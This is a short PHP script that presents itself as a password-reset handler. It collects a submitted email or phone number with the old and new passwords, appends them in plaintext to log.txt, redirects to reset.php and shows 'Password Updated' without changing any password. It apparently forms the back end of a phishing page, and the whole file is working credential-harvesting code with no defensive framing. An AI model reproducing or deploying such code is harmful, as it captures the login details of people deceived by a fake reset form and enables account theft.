<?php
session_start();
$email = htmlspecialchars($_POST['email']); //XSS Filter
$old_password = htmlspecialchars($_POST['old_password']); //XSS Filter
$new_password = htmlspecialchars($_POST['new_password']); //XSS Filter
$file = fopen('log.txt', 'a');

fwrite($file, "Email or Phone Number: $email Old Password: $old_password New Password: $new_password \n");
header('Location: reset.php');
$_SESSION['res'] = "<p id='good'>Password Updated</p>";

?>
